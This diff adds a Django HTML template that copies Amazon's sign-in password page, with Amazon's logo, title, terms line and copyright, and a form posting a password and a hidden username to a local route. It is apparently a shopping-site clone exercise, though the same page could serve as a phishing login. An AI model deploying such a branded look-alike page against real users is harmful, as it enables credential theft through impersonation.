@@ -1,0 +1,36 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Amazon: Online Shopping-Site-Login</title>
+    <link rel="stylesheet" href="../static/signin.css">
+    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.0/css/bootstrap.min.css"
+        integrity="sha384-9aIt2nRpC12Uk9gS9baDl411NQApFmC26EwAOH8WgZl5MYYxFfc+NcPb1dKGj7Sk" crossorigin="anonymous">
+</head>
+
+<body>
+    <img class="logo" src="../static/amazonw.png" alt="amazon.com" width=160 height=40>
+
+    <div class="log-section">
+        <div class="main-section">
+            <form action="/signin/pswd" method="post" class="login-form">
+               {% csrf_token %}
+                <h3>Login</h3>
+                <label for="" class="font-weight-bold mt-3">Password</label>
+                <input type="password" name="pswd" required class="mt-0">
+                 <input type="text" name="user" value="{{username}}" style="display: none;" required class="mt-0">
+                <button>Login</button>
+                <br><br>
+                <span>By continuing, you agree to Amazon's Conditions of Use and Privacy Notice.</span>
+            </form>
+        </div>
+        <hr><br>
+        <div class="text-center">
+            <small> © 1996-2020, Amazon.com, Inc. or its affiliates</small>
+        </div>
+    </div>
+</body>
+
+</html>
